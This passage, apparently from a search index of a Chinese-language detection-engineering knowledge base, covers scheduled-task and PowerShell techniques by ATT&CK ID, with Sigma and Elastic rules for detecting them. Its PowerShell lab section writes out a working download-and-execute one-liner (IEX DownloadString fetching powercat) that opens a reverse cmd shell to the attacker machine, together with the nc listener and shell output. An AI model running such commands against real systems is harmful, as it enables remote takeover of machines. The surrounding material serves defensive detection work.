Scheduler\u4e00\u8d77\u4f7f\u7528\u6765\u8c03\u5ea6\u7a0b\u5e8f\u6216\u811a\u672c\u5728\u67d0\u65e5\u671f\u548c\u65f6\u95f4\u6267\u884c\u3002\u53ea\u8981\u8eab\u4efd\u8ba4\u8bc1\u901a\u8fc7\u53ef\u4ee5\u4f7f\u7528RPC\uff0c\u5e76\u4e14\u6253\u5f00\u4e86\u6587\u4ef6\u548c\u6253\u5370\u673a\u5171\u4eab\u529f\u80fd\uff0c\u5c31\u53ef\u4ee5\u5728\u8fdc\u7a0b\u7cfb\u7edf\u4e0a\u8c03\u5ea6\u4efb\u52a1\u3002\u5728\u8fdc\u7a0b\u7cfb\u7edf\u4e0a\u8c03\u5ea6\u4efb\u52a1\u901a\u5e38\u9700\u8981\u8fdc\u7a0b\u7cfb\u7edf\u7ba1\u7406\u5458\u7fa4\u7ec4\u7684\u6210\u5458\u6267\u884c\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u4efb\u52a1\u8c03\u5ea6\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u6216\u5728\u8ba1\u5212\u7684\u57fa\u7840\u4e0a\u6267\u884c\u7a0b\u5e8f\u4ee5\u5b9e\u73b0\u6301\u4e45\u6027\uff0c\u4f5c\u4e3a\u6a2a\u5411\u79fb\u52a8\u7684\u4e00\u90e8\u5206\u8fdb\u884c\u8fdc\u7a0b\u6267\u884c\uff0c\u83b7\u5f97\u7cfb\u7edf\u6743\u9650\uff0c\u6216\u8005\u5728\u6307\u5b9a\u8d26\u53f7\u7684\u4e0a\u4e0b\u6587\u4e0b\u8fd0\u884c\u8fdb\u7a0b\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E9%80%9A%E8%BF%87GPO%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%BF%9B%E8%A1%8C%E5%A4%A7%E8%A7%84%E6%A8%A1%E7%9A%84%E6%8C%81%E4%B9%85%E6%80%A7%E5%92%8C%E6%89%A7%E8%A1%8C/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u901a\u8fc7Group Policy Management Console (GPMC) \u5b9e\u73b0\u8ba1\u5212\u4efb\u52a1\u7684\u8fdc\u7a0b\u6267\u884c\uff1b</p> <p>\u5177\u4f53\u53ef\u53c2\u80033gstudent\u5927\u4f6c\u7684\u6587\u7ae0</p> <p>GPO\u7ec4\u7b56\u7565\u5b89\u5168</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E9%80%9A%E8%BF%87GPO%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%BF%9B%E8%A1%8C%E5%A4%A7%E8%A7%84%E6%A8%A1%E7%9A%84%E6%8C%81%E4%B9%85%E6%80%A7%E5%92%8C%E6%89%A7%E8%A1%8C/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows\u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E9%80%9A%E8%BF%87GPO%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%BF%9B%E8%A1%8C%E5%A4%A7%E8%A7%84%E6%A8%A1%E7%9A%84%E6%8C%81%E4%B9%85%E6%80%A7%E5%92%8C%E6%89%A7%E8%A1%8C/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E9%80%9A%E8%BF%87GPO%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%BF%9B%E8%A1%8C%E5%A4%A7%E8%A7%84%E6%A8%A1%E7%9A%84%E6%8C%81%E4%B9%85%E6%80%A7%E5%92%8C%E6%89%A7%E8%A1%8C/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E9%80%9A%E8%BF%87GPO%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%BF%9B%E8%A1%8C%E5%A4%A7%E8%A7%84%E6%A8%A1%E7%9A%84%E6%8C%81%E4%B9%85%E6%80%A7%E5%92%8C%E6%89%A7%E8%A1%8C/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<pre><code>title: \u901a\u8fc7GPO\u8ba1\u5212\u4efb\u52a1\u8fdb\u884c\u5927\u89c4\u6a21\u7684\u6301\u4e45\u6027\u548c\u6267\u884c\ndescription: \u4f7f\u7528GPO\u8ba1\u5212\u4efb\u52a1\u68c0\u6d4b\u6a2a\u5411\u79fb\u52a8\uff0c\u901a\u5e38\u7528\u4e8e\u5927\u89c4\u6a21\u90e8\u7f72\u52d2\u7d22\u8f6f\u4ef6\nauthor: 12306Br0(\u7ffb\u8bd1+\u6d4b\u8bd5)\ndate: 2020/06/07\nreferences:\n    - https://twitter.com/menasec1/status/1106899890377052160\n    - https://www.secureworks.com/blog/ransomware-as-a-distraction\ntags:\n    - attack.persistence\n    - attack.lateral_movement\n    - attack.t1053-002\nlogsource:\n    product: windows\n    service: security\n    description: '\u5fc5\u987b\u4e3a\u6210\u529f/\u5931\u8d25\u914d\u7f6e\u9ad8\u7ea7\u5ba1\u6838\u7b56\u7565\u8bbe\u7f6e\u201c\u5bf9\u8c61\u8bbf\u95ee&gt;\u5ba1\u6838\u8be6\u7ec6\u6587\u4ef6\u5171\u4eab'\ndetection:\n    selection:\n        EventID: 5145\n        ShareName: \\\\*\\SYSVOL\n        RelativeTargetName: '*ScheduledTasks.xml'\n        Accesses: '*WriteData*'\n    condition: selection\nfalsepositives:\n    - \u5982\u679c\u6e90IP\u4e0d\u662flocalhost\uff0c\u5219\u5b83\u975e\u5e38\u53ef\u7591\uff0c\u6700\u597d\u540c\u65f6\u76d1\u89c6\u5bf9GPO\u8ba1\u5212\u4efb\u52a1\u7684\u672c\u5730\u548c\u8fdc\u7a0b\u66f4\u6539\nlevel: high\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E9%80%9A%E8%BF%87GPO%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%BF%9B%E8%A1%8C%E5%A4%A7%E8%A7%84%E6%A8%A1%E7%9A%84%E6%8C%81%E4%B9%85%E6%80%A7%E5%92%8C%E6%89%A7%E8%A1%8C/#_6","title":"\u5176\u4ed6\u68c0\u6d4b\u601d\u8def","text":"<p>\u901a\u8fc7\u547d\u4ee4\u884c\u8c03\u7528\u6765\u76d1\u63a7\u5e38\u7528\u5b9e\u7528\u7a0b\u5e8f\u7684\u8ba1\u5212\u4efb\u52a1\u521b\u5efa\u3002\u53ef\u4ee5\u5728\u5b89\u88c5\u65b0\u8f6f\u4ef6\u671f\u95f4\u6216\u901a\u8fc7\u7cfb\u7edf\u7ba1\u7406\u529f\u80fd\u521b\u5efa\u5408\u6cd5\u7684\u8ba1\u5212\u4efb\u52a1\u3002\u76d1\u63a7Windows 10\u4e2dsvchost.exe \u548c\u65e7\u7248Windows \u4e2dWindows\u4efb\u52a1\u8ba1\u5212\u7a0b\u5e8f taskeng.exe\u7684\u8fdb\u7a0b\u6267\u884c\u60c5\u51b5\u3002\u5982\u679c\u8ba1\u5212\u4efb\u52a1\u4e0d\u7528\u4e8e\u6301\u4e45\u6027\uff0c\u5219\u653b\u51fb\u8005\u5f88\u53ef\u80fd\u5728\u64cd\u4f5c\u5b8c\u6210\u65f6\u5220\u9664\u8be5\u4efb\u52a1\u3002\u76d1\u63a7%systemroot%\\System32\\Tasks\u4e2d\u7684Windows\u4efb\u52a1\u8ba1\u5212\u7a0b\u5e8f\u4ed3\u5e93\u6765\u67e5\u770b\u662f\u5426\u6709\u4e0e\u5df2\u77e5\u8f6f\u4ef6\u3001\u8865\u4e01\u5468\u671f\u7b49\u4e0d\u76f8\u5173\u7684\u8ba1\u5212\u4efb\u52a1\u7684\u66f4\u6539\u6761\u76ee\u3002\u4e0d\u5e94\u5b64\u7acb\u5730\u770b\u5f85\u6570\u636e\u548c\u4e8b\u4ef6\uff0c\u800c\u5e94\u5c06\u5176\u89c6\u4e3a\u53ef\u80fd\u5bfc\u81f4\u5176\u4ed6\u6d3b\u52a8\u7684\u4e00\u7cfb\u5217\u884c\u4e3a\u4e2d\u7684\u4e00\u90e8\u5206\uff0c\u4f8b\u5982\u4e3a\u547d\u4ee4\u4e0e\u63a7\u5236\u800c\u5efa\u7acb\u7f51\u7edc\u8fde\u63a5\uff0c\u901a\u8fc7\u53d1\u73b0\u4e86\u89e3\u73af\u5883\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u4ee5\u53ca\u6a2a\u5411\u79fb\u52a8\u3002</p> <p>\u901a\u8fc7\u5728\u4e8b\u4ef6\u65e5\u5fd7\u670d\u52a1\u4e2d\u542f\u7528\u201cMicrosoft-Windows-TaskScheduler / Operational\u201d\u8bbe\u7f6e\u7684\u65b9\u5f0f\u6765\u4e3a\u8ba1\u5212\u4efb\u52a1\u7684\u521b\u5efa\u548c\u66f4\u6539\u914d\u7f6e\u4e8b\u4ef6\u65e5\u5fd7\u529f\u80fd\u3002\u7136\u540e\u4f1a\u5728\u8ba1\u5212\u4efb\u52a1\u6d3b\u52a8\u4e2d\u8bb0\u5f55\u5982\u4e0b\u4e8b\u4ef6\uff1a</p> <p>\u00b7 Windows 7\uff0cServer 2008 R2\u4e0a\u7684\u4e8b\u4ef6106 \u2013 \u5df2\u6ce8\u518c\u8ba1\u5212\u4efb\u52a1</p> <p>\u00b7 Windows 7\uff0cServer 2008 R2\u4e0a\u7684\u4e8b\u4ef6140/Windows 10\uff0cServer 2016\u4e0a\u7684\u4e8b\u4ef64702 \u2013 \u5df2\u66f4\u65b0\u8ba1\u5212\u4efb\u52a1</p> <p>\u00b7 Windows 7\uff0cServer 2008 R2\u4e0a\u7684\u4e8b\u4ef6141/Windows 10\uff0cServer 2016\u4e0a\u7684\u4e8b\u4ef64699 \u2013 \u5df2\u5220\u9664\u8ba1\u5212\u4efb\u52a1</p> <p>\u00b7 Windows 10\uff0cServer 2016\u4e0a\u7684\u4e8b\u4ef64698 \u2013 \u5df2\u521b\u5efa\u8ba1\u5212\u4efb\u52a1</p> <p>\u00b7 Windows 10\uff0cServer 2016\u4e0a\u7684\u4e8b\u4ef64700 \u2013 \u5df2\u542f\u7528\u8ba1\u5212\u4efb\u52a1</p> <p>\u00b7 Windows 10\uff0cServer 2016\u4e0a\u7684\u4e8b\u4ef64701 \u2013 \u5df2\u7981\u7528\u8ba1\u5212\u4efb\u52a1</p> <p>\u4e5f\u53ef\u4f7f\u7528Sysinternals Autoruns\u7b49\u5de5\u5177\u6765\u68c0\u6d4b\u662f\u5426\u6709\u65e8\u5728\u83b7\u5f97\u6301\u4e45\u6027\u7684\u7cfb\u7edf\u66f4\u6539\uff0c\u5305\u62ec\u5217\u51fa\u5f53\u524d\u7684\u8ba1\u5212\u4efb\u52a1\u3002\u67e5\u627e\u4e0e\u5df2\u77e5\u8f6f\u4ef6\u3001\u8865\u4e01\u5468\u671f\u7b49\u4e0d\u76f8\u5173\u7684\u4efb\u52a1\u66f4\u6539\u3002\u5f53\u4e0e\u5386\u53f2\u6570\u636e\u8fdb\u884c\u6bd4\u8f83\u65f6\uff0c\u901a\u8fc7\u8ba1\u5212\u4efb\u52a1\u6267\u884c\u7684\u53ef\u7591\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u663e\u793a\u4e3a\u4ee5\u524d\u4ece\u672a\u89c1\u8fc7\u7684\u5f02\u5e38\u8fdb\u7a0b\u3002</p> <p>\u76d1\u63a7\u53ef\u7528\u4e8e\u521b\u5efa\u4efb\u52a1\u7684\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\u3002\u5e26\u5185\u7f6e\u529f\u80fd\u7684\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u4e0eWindows API\u4ea4\u4e92\uff0c\u5728\u5178\u578b\u7684\u7cfb\u7edf\u5b9e\u7528\u7a0b\u5e8f\u4e4b\u5916\u6267\u884c\u8fd9\u4e9b\u529f\u80fd\u3002Windows\u7cfb\u7edf\u7ba1\u7406\u5de5\u5177\uff08\u5982Windows Management Instrumentation\u548cPowerShell\uff09\u4e5f\u53ef\u7528\u6765\u521b\u5efa\u4efb\u52a1\uff0c\u56e0\u6b64\u53ef\u80fd\u8fd8\u9700\u8981\u914d\u7f6e\u65e5\u5fd7\u529f\u80fd\u6765\u6536\u96c6\u9002\u5f53\u7684\u6570\u636e\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E9%80%9A%E8%BF%87GPO%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%BF%9B%E8%A1%8C%E5%A4%A7%E8%A7%84%E6%A8%A1%E7%9A%84%E6%8C%81%E4%B9%85%E6%80%A7%E5%92%8C%E6%89%A7%E8%A1%8C/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1053-002</p> <p>https://attack.mitre.org/techniques/T1053/002/</p> <p>\u5229\u7528GPO\u4e2d\u7684\u8ba1\u5212\u4efb\u52a1\u5b9e\u73b0\u8fdc\u7a0b\u6267\u884c</p> <p>http://app.myzaker.com/news/article.php?pk=5c19b0d477ac64586a2bf889</p> <p>GPO\u7ec4\u7b56\u7565\u5b89\u5168</p> <p>https://www.cnblogs.com/zpchcbd/p/12932181.html</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-005-win-schtasks%E6%9C%AC%E5%9C%B0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/","title":"T1053-005-win-schtasks\u672c\u5730\u8ba1\u5212\u4efb\u52a1","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-005-win-schtasks%E6%9C%AC%E5%9C%B0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u8bf8\u5982at\u548cschtasks\u4e4b\u7c7b\u7684\u5b9e\u7528\u7a0b\u5e8f\u53ef\u4e0eWindows Task Scheduler\u4e00\u8d77\u4f7f\u7528\u6765\u8c03\u5ea6\u7a0b\u5e8f\u6216\u811a\u672c\u5728\u67d0\u65e5\u671f\u548c\u65f6\u95f4\u6267\u884c\u3002\u53ea\u8981\u8eab\u4efd\u8ba4\u8bc1\u901a\u8fc7\u53ef\u4ee5\u4f7f\u7528RPC\uff0c\u5e76\u4e14\u6253\u5f00\u4e86\u6587\u4ef6\u548c\u6253\u5370\u673a\u5171\u4eab\u529f\u80fd\uff0c\u5c31\u53ef\u4ee5\u5728\u8fdc\u7a0b\u7cfb\u7edf\u4e0a\u8c03\u5ea6\u4efb\u52a1\u3002\u5728\u8fdc\u7a0b\u7cfb\u7edf\u4e0a\u8c03\u5ea6\u4efb\u52a1\u901a\u5e38\u9700\u8981\u8fdc\u7a0b\u7cfb\u7edf\u7ba1\u7406\u5458\u7fa4\u7ec4\u7684\u6210\u5458\u6267\u884c\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u4efb\u52a1\u8c03\u5ea6\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u6216\u5728\u8ba1\u5212\u7684\u57fa\u7840\u4e0a\u6267\u884c\u7a0b\u5e8f\u4ee5\u5b9e\u73b0\u6301\u4e45\u6027\uff0c\u4f5c\u4e3a\u6a2a\u5411\u79fb\u52a8\u7684\u4e00\u90e8\u5206\u8fdb\u884c\u8fdc\u7a0b\u6267\u884c\uff0c\u83b7\u5f97\u7cfb\u7edf\u6743\u9650\uff0c\u6216\u8005\u5728\u6307\u5b9a\u8d26\u53f7\u7684\u4e0a\u4e0b\u6587\u4e0b\u8fd0\u884c\u8fdb\u7a0b\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-005-win-schtasks%E6%9C%AC%E5%9C%B0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u5b89\u6392\u547d\u4ee4\u548c\u7a0b\u5e8f\u5b9a\u671f\u8fd0\u884c\u6216\u5728\u6307\u5b9a\u65f6\u95f4\u5185\u8fd0\u884c\u3002\u4ece\u8ba1\u5212\u8868\u4e2d\u6dfb\u52a0\u548c\u5220\u9664\u4efb\u52a1\uff0c\u6309\u9700\u8981\u542f\u52a8\u548c\u505c\u6b62\u4efb\u52a1\uff0c\u663e\u793a\u548c\u66f4\u6539\u8ba1\u5212\u4efb\u52a1\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-005-win-schtasks%E6%9C%AC%E5%9C%B0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows\u5b89\u5168\u65e5\u5fd7/sysmon\u65e5\u5fd7</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-005-win-schtasks%E6%9C%AC%E5%9C%B0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0\uff0c\u53c2\u8003\uff1aSchtasks\u547d\u4ee4\u8be6\u89e3</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-005-win-schtasks%E6%9C%AC%E5%9C%B0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0\uff0c\u53ef\u53c2\u770bwindows 4688\u8fdb\u7a0b\u521b\u5efa\u65e5\u5fd7\u6837\u4f8b\uff0c\u8f85\u52a9\u7406\u89e3\u3002</p> <pre><code>Pre-Windows 2016/10\nA new process has been created.\n\nSubject:\n\n   Security ID:  WIN-R9H529RIO4Y\\Administrator\n   Account Name:  Administrator\n   Account Domain:  WIN-R9H529RIO4Y\n   Logon ID:  0x1fd23\n\nProcess Information:\n\n   New Process ID:  0xed0\n   New Process Name: C:\\Windows\\System32\\notepad.exe\n   Token Elevation Type: TokenElevationTypeDefault (1)\n   Mandatory Label: Mandatory Label\\Medium Mandatory Level\n   Creator Process ID: 0x8c0\n   Creator Process Name: c:\\windows\\system32\\explorer.exe\n   Process Command Line: C:\\Windows\\System32\\notepad.exe c:\\sys\\junk.txt\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-005-win-schtasks%E6%9C%AC%E5%9C%B0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-005-win-schtasks%E6%9C%AC%E5%9C%B0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#sigma","title":"Sigma","text":"<pre><code>title: schtasks\u672c\u5730\u8ba1\u5212\u4efb\u52a1\ndescription: \u68c0\u6d4b\u53ef\u7591\u7684schtasks\u672c\u5730\u8ba1\u5212\u4efb\u52a1\nauthor: 12306Br0\nreferences:\n    - https://www.elastic.co/guide/en/siem/guide/current/local-scheduled-task-commands.html\ntags:\n    - attack.persistence\n    - attack.t1053-005\nlogsource:\n    product: windows\n    service: sysmon / \u5b89\u5168\u65e5\u5fd7 #\u81ea\u884c\u914d\u7f6e\ndetection:\n    selection:\n        EventID: \n              - 4688 #windows\u5b89\u5168\u65e5\u5fd7 \u8fdb\u7a0b\u521b\u5efa\n              - 1 #windows sysmon\u65e5\u5fd7 \u8fdb\u7a0b\u521b\u5efa\n        Process Name: 'schtasks.exe'\n        CommandLine: \n              - '/create'\n              - '-create'\n              - '/S'\n              - '-s'\n              - '/run'\n              - '-run'\n              - '/change'\n              - '-change'\n    condition: selection\nlevel: low\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-005-win-schtasks%E6%9C%AC%E5%9C%B0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#elastic-rule-query","title":"Elastic rule query","text":"<pre><code>event.action:\"Process Create (rule: ProcessCreate)\" and\nprocess.name:schtasks.exe and process.args:(-change or -create or -run\nor -s or /S or /change or /create or /run)\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-005-win-schtasks%E6%9C%AC%E5%9C%B0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#_6","title":"\u5efa\u8bae","text":"<p>\u9664\u4e86\u57fa\u4e8esysmon\u65e5\u5fd7\u4e4b\u5916\uff0c\u9ad8\u7248\u672c\u7684Windows\u64cd\u4f5c\u7cfb\u7edf\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u7cfb\u7edf\u5b89\u5168\u65e5\u5fd7\u4e2d4688\u8fdb\u884c\u68c0\u6d4b\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-005-win-schtasks%E6%9C%AC%E5%9C%B0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1053-005</p> <p>https://attack.mitre.org/techniques/T1053/005/</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/","title":"T1059-win-\u57fa\u4e8e\u767d\u540d\u5355Powershell.exe\u6267\u884cPayload","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u547d\u4ee4\u884c\u754c\u9762\u662f\u4e0e\u8ba1\u7b97\u673a\u7cfb\u7edf\u4ea4\u4e92\u7684\u4e00\u79cd\u65b9\u5f0f\uff0c\u5e76\u4e14\u662f\u5f88\u591a\u64cd\u4f5c\u7cfb\u7edf\u5e73\u53f0\u7684\u5e38\u89c1\u7279\u6027\u3002\u4f8b\u5982\uff0cWindows\u7cfb\u7edf\u4e0a\u7684\u547d\u4ee4\u884c\u754c\u9762cmd\u53ef\u7528\u4e8e\u6267\u884c\u8bb8\u591a\u4efb\u52a1\uff0c\u5305\u62ec\u6267\u884c\u5176\u4ed6\u8f6f\u4ef6\u3002\u547d\u4ee4\u884c\u754c\u9762\u53ef\u5728\u672c\u5730\u4ea4\u4e92\u6216\u8005\u901a\u8fc7\u8fdc\u7a0b\u684c\u9762\u5e94\u7528\u3001\u53cd\u5411shell\u4f1a\u8bdd\u7b49\u8fdc\u7a0b\u4ea4\u4e92\u3002\u6267\u884c\u7684\u547d\u4ee4\u4ee5\u547d\u4ee4\u884c\u754c\u9762\u8fdb\u7a0b\u7684\u5f53\u524d\u6743\u9650\u7ea7\u522b\u8fd0\u884c\uff0c\u9664\u975e\u8be5\u547d\u4ee4\u9700\u8981\u8c03\u7528\u8fdb\u7a0b\u6765\u66f4\u6539\u6743\u9650\u4e0a\u4e0b\u6587\uff08\u4f8b\u5982\uff0c\u5b9a\u65f6\u4efb\u52a1\uff09\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u547d\u4ee4\u884c\u754c\u9762\u4e0e\u7cfb\u7edf\u4ea4\u4e92\u5e76\u5728\u64cd\u4f5c\u8fc7\u7a0b\u4e2d\u6267\u884c\u5176\u4ed6\u8f6f\u4ef6\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u60a8\u53ef\u4ee5\u4f7f\u7528PowerShell.exe\u4ece\u53e6\u4e00\u4e2a\u5de5\u5177\uff08\u4f8b\u5982Cmd.exe\uff09\u7684\u547d\u4ee4\u884c\u542f\u52a8PowerShell\u4f1a\u8bdd\uff0c\u4e5f\u53ef\u4ee5\u5728PowerShell\u547d\u4ee4\u884c\u542f\u52a8\u65b0\u4f1a\u8bdd\u3002\u4ece\u6b64\u5904\u9605\u8bfbMicrosoft Windows\u5b98\u65b9\u7f51\u7ad9\u4e0a\u7684\u66f4\u591a\u4fe1\u606f\u3002</p> <p>\u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672cpowershell\uff08V5\u4ee5\u4e0a\u542bV5\uff09\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\uff0c\u5177\u4f53\u7b56\u7565\u53ef\u53c2\u8003powershell\u4e8b\u4ef6\u3002\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7/SYSMON\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u5b89\u88c5\uff09</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#_4","title":"\u73af\u5883\u51c6\u5907","text":"<p>\u653b\u51fb\u673a\uff1aKali2019</p> <p>\u9776\u673a\uff1awin7\uff08sysmon\uff09</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#_5","title":"\u653b\u51fb\u5206\u6790","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#payload","title":"\u751f\u6210payload","text":"<p>\u4e0b\u8f7d\u6211\u4eec\u672c\u6b21\u6d4b\u8bd5\u4e2d\u8981\u7528\u5230\u7684powercat\uff0c\u4e0b\u8f7d\u5730\u5740\uff1ahttps://github.com/besimorhino/powercat</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#http","title":"\u5f00\u542f\u5c0f\u578bhttp\u670d\u52a1","text":"<p>powercat\u76ee\u5f55\u4e0b\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1a</p> <pre><code>root@12306Br0:~# python2 -m SimpleHTTPServer 80\nServing HTTP on 0.0.0.0 port 80 ...\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#_6","title":"\u6267\u884c\u76d1\u542c","text":"<pre><code>nc -lvp 1234\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#payload_1","title":"\u9776\u673a\u6267\u884cpayload","text":"<pre><code>powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.126.146/powercat.ps1');powercat -c 192.168.126.146 -p 1234 -e cmd\"\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Powershell.exe%E6%89%A7%E8%A1%8CPayload/#shell","title":"\u53cd\u5f39shell","text":"<pre><code>root@12306Br0:/# nc -lvp 1234\nlistening on [any] 1234 ...\n192.168.126.149: inverse host lookup failed: Unknown host\nconnect to [192.168.126.146] from (UNKNOWN) [192.168.126.149] 49339\nMicrosoft Windows [\ufffd\u6c7e 6.1.7601]\n\ufffd\ufffd\u0228\ufffd\ufffd\ufffd\ufffd (c) 2009 Microsoft 